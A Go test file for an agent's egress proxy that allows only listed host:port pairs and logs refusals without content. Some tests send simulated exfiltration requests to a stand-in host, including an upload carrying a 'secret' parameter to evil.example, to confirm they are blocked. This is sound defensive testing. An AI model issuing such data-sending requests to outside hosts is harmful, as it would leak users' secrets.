package main

// Acceptance tests for CSR-63: the egress proxy lets the agent reach exactly
// the listed host:port pairs, refuses everything else, and logs each refusal
// as one JSON line with the host, the port and the time, never the content.

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"reflect"
	"strconv"
	"strings"
	"sync"
	"testing"
)

func TestParseAllowExactHostAndPort(t *testing.T) {
	got, err := parseAllow([]string{"API.Example.com:443", "x.example:8080"})
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]bool{"api.example.com:443": true, "x.example:8080": true}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("parseAllow = %v, want %v", got, want)
	}
	// No wildcards, no entry without a port, no port outside 1-65535.
	for _, bad := range []string{"example.com", "*.example.com:443", ":443", "example.com:http", "example.com:0", "example.com:70000", ""} {
		if _, err := parseAllow([]string{bad}); err == nil {
			t.Errorf("parseAllow(%q) = nil error, want refused", bad)
		}
	}
}

// syncBuffer is the proxy's log, written from its handler goroutines.
type syncBuffer struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}

func (s *syncBuffer) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.String()
}

// startProxy runs the proxy with allow as its list and returns its address
// and its log.
func startProxy(t *testing.T, allow ...string) (string, *syncBuffer) {
	t.Helper()
	set, err := parseAllow(allow)
	if err != nil {
		t.Fatal(err)
	}
	log := &syncBuffer{}
	srv := httptest.NewServer(newProxy(set, log))
	t.Cleanup(srv.Close)
	return srv.Listener.Addr().String(), log
}

// echoServer accepts TCP connections on loopback and echoes what it reads.
func echoServer(t *testing.T) int {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { l.Close() })
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			go func() { defer c.Close(); _, _ = io.Copy(c, c) }()
		}
	}()
	return l.Addr().(*net.TCPAddr).Port
}

// connect sends CONNECT target with extra header lines and returns the
// response status and the open connection.
func connect(t *testing.T, proxy, target string, header ...string) (int, net.Conn, *bufio.Reader) {
	t.Helper()
	c, err := net.Dial("tcp", proxy)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.Close() })
	req := "CONNECT " + target + " HTTP/1.1\r\nHost: " + target + "\r\n" + strings.Join(header, "") + "\r\n"
	if _, err := io.WriteString(c, req); err != nil {
		t.Fatal(err)
	}
	r := bufio.NewReader(c)
	resp, err := http.ReadResponse(r, &http.Request{Method: http.MethodConnect})
	if err != nil {
		t.Fatal(err)
	}
	return resp.StatusCode, c, r
}

// refusals parses the proxy's log into its "refused" lines.
func refusals(t *testing.T, log string) []map[string]any {
	t.Helper()
	var out []map[string]any
	for _, line := range strings.Split(strings.TrimSpace(log), "\n") {
		if line == "" {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			t.Fatalf("log line %q is not JSON: %v", line, err)
		}
		if m["msg"] == "refused" {
			out = append(out, m)
		}
	}
	return out
}

// The proxy resolves the name itself and tunnels to the listed host:port;
// the host matches case-insensitively.
func TestConnectToAListedHostTunnels(t *testing.T) {
	port := echoServer(t)
	target := "localhost:" + strconv.Itoa(port)
	proxy, log := startProxy(t, target)
	for _, asked := range []string{target, "LocalHost:" + strconv.Itoa(port)} {
		status, c, r := connect(t, proxy, asked)
		if status != http.StatusOK {
			t.Fatalf("CONNECT %s = %d, want 200", asked, status)
		}
		if _, err := io.WriteString(c, "ping\n"); err != nil {
			t.Fatal(err)
		}
		if line, err := r.ReadString('\n'); err != nil || line != "ping\n" {
			t.Errorf("through the tunnel to %s: %q, %v", asked, line, err)
		}
	}
	if got := refusals(t, log.String()); len(got) != 0 {
		t.Errorf("refusals logged for a listed host: %v", got)
	}
}

// Anything not listed exactly is refused with 403 and logged by host and
// port: another port, a subdomain, the same target by IP, any other host.
func TestConnectToAnUnlistedHostIsRefusedAndLogged(t *testing.T) {
	port := echoServer(t)
	proxy, log := startProxy(t, "localhost:"+strconv.Itoa(port))
	tests := []struct{ target, host, port string }{
		{"localhost:" + strconv.Itoa(port+1), "localhost", strconv.Itoa(port + 1)},
		{"sub.localhost:" + strconv.Itoa(port), "sub.localhost", strconv.Itoa(port)},
		{"127.0.0.1:" + strconv.Itoa(port), "127.0.0.1", strconv.Itoa(port)},
		{"evil.example:443", "evil.example", "443"},
	}
	for _, tt := range tests {
		if status, _, _ := connect(t, proxy, tt.target, "X-Probe: payload-marker\r\n"); status != http.StatusForbidden {
			t.Errorf("CONNECT %s = %d, want 403", tt.target, status)
		}
	}
	got := refusals(t, log.String())
	if len(got) != len(tests) {
		t.Fatalf("refusals = %v, want one per refused target", got)
	}
	for i, tt := range tests {
		if got[i]["host"] != tt.host || got[i]["port"] != tt.port || got[i]["time"] == nil {
			t.Errorf("refusal %d = %v, want host %s port %s and a time", i, got[i], tt.host, tt.port)
		}
	}
	if strings.Contains(log.String(), "payload-marker") {
		t.Errorf("the log holds request content:\n%s", log)
	}
}

func viaProxy(proxy string) *http.Client {
	u := &url.URL{Scheme: "http", Host: proxy}
	return &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(u)}}
}

// A plain http:// request (HTTP_PROXY) to a listed host:port is forwarded.
func TestHTTPToAListedHostIsForwarded(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "hello from "+r.URL.Path)
	}))
	t.Cleanup(backend.Close)
	port := backend.Listener.Addr().(*net.TCPAddr).Port
	proxy, _ := startProxy(t, "localhost:"+strconv.Itoa(port))
	resp, err := viaProxy(proxy).Get("http://localhost:" + strconv.Itoa(port) + "/hi")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK || string(body) != "hello from /hi" {
		t.Errorf("GET = %d %q, want 200 from the backend", resp.StatusCode, body)
	}
}

// A plain http:// request to an unlisted host is refused and logged with
// port 80 when the URL has none.
func TestHTTPToAnUnlistedHostIsRefusedAndLogged(t *testing.T) {
	proxy, log := startProxy(t, "localhost:1")
	resp, err := viaProxy(proxy).Get("http://evil.example/upload?secret=payload-marker")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("GET = %d, want 403", resp.StatusCode)
	}
	got := refusals(t, log.String())
	if len(got) != 1 || got[0]["host"] != "evil.example" || got[0]["port"] != "80" {
		t.Errorf("refusals = %v, want evil.example port 80", got)
	}
	if strings.Contains(log.String(), "payload-marker") {
		t.Errorf("the log holds request content:\n%s", log)
	}
}
